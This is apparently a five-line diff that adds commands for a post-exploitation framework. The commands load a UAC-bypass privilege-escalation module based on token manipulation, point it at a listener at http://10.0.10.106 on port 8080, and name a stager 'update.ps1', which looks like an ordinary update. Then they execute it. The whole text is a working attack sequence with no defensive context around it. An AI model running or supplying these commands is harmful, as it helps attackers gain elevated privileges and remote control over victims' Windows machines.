@@ -1,0 +1,5 @@
+usemodule privesc/bypassuac_tokenmanipulation
+set Host http://10.0.10.106
+set Port 8080
+set Stager update.ps1
+execute
